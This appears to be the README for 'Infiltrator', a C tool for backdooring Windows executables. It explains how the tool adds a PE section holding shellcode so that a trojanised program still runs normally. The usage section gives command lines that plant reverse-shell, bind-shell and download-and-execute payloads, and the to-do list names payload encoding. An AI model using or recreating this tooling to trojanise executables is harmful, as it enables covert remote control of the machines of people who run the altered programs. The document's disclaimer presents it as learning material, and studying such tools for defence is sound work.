Infiltrator
===========

Infiltrator 0.1

License:

  Infiltrator by Saif El-Sherei is licensed under the Creative Commons Attribution-NonCommercial 3.0 Unported License. To view a copy of this license, visit http://creativecommons.org/licenses/by-nc/3.0/.
  
Disclaimer:

	This Tool is for learning & Demonstration only. the author is not responsible for any misuse of this code or tool. 
	
Introduction:

	Intifltrator is my first c project (so dont be so harsh :D). It is a PE Executable backdoor tool. i.e. it inserts payloads in exe files so the exe will function normally and execute our own code through it.
the working model is as follows.

 read input PE IMAGE_DOS_HEADERS --> read input PE IMAGE_NET_HEADERS --> read PE IMAGE_SECTION_HEADER list --> 	add new IMAGE_SECTION_HEADER -- > increase Number of Sections in IMAGE_NT_HEADER.File Header.NumberOfSections -->
increase ImageSize in IMAGE_NT_HEADER.OptionalHeader.ImageSize --> add rest of PE file --> write payload in our new section --> write to new PE file 

Refrences:
https://www.corelan.be/index.php/2010/02/25/exploit-writing-tutorial-part-9-introduction-to-win32-shellcoding/
http://win32assembly.programminghorizon.com
http://en.wikibooks.org/wiki/X86_Disassembly/Windows_Executable_Files#MS-DOS_header
http://www.sunshine2k.de/reversing/tuts/tut_addsec.htm
http://msdn.microsoft.com/en-us/library/ms809762.aspx
http://www.codereversing.com/blog/?p=92
http://www.alex-ionescu.com/part1.pdf

Credits:
		[*] corelanc0d3r "https://www.corelan.be".
				"Thanks for the insight on the threaded shellcode & amazing tutorials"
		[*] Sherif El deeb "http://eldeeb.net/wrdprs/".
				"Thanks for the continous motovation, inspiration, & help through out this"
		[*] Metasploit Team.
				" Thanks for the amazingly well documented project metasploit framework"

Author:
		[*] Saif El-Sherei 	* website: "http://www.elsherei.com" 
							* Twitter: @saif_sherei
							* email: saif.elsherei@gmail.com
Features:
		[*] Three Payload Types (bind tcp, reverse tcp, download and execute).
		[*] Choose between threaded shellcode or blocking shellcode.
		[*] specify shellcode options; no need for hardcoding (see usage below).
		[*] PE executable works normaly without any issues.
Todo:
		[*] Payload encoding.
Usage:

 Infiltrator -i [INPUT EXE] -o [OUTPUT EXE] -k (threaded) or -s (Normal) [type]
                 -p [PORT] -h [HOST] -u [URL] -f [URL path] -of [output file]

[*] Example:

- infiltrator -i "input.exe" -o "output.exe" -k "reverse" -p 1234 -h "127.0.0.1"
- infiltrator -i "input.exe" -o "output.exe" -k "bind" -p 1234 
- infiltrator -i "input.exe" -o "output.exe" -s "download & execute" -u www.test.com -f "test.exe" -of "test-output.exe"

[*] Options:

 -i     INPUT file.exe (PE)
 -o  OUPUT file.exe (PE)
 -s     Normal Shellcode followed by one of the payload
        types
 -k     Threaded Shellcode followed by one of the payload
        types

[*] Payload Types:

 bind                           Bind payload Followed by payload options
 reverse                        Connect Back Payload Followed by payload options

 download & execute     Download & exec Payload Followed by payload options

[*] Payload Options:

 -p [port]                      port to use (Bind or Reverse Payload)
 -h [host]                      Host to connect to (Reverse Payload)
 -u [url]                       URL to connect to (Download & Exec Payload)
 -f [path]                      path to file to fetch (Download & Exec Payload)
 -of[output file]       output file to Execute from  Download & Exec Payload
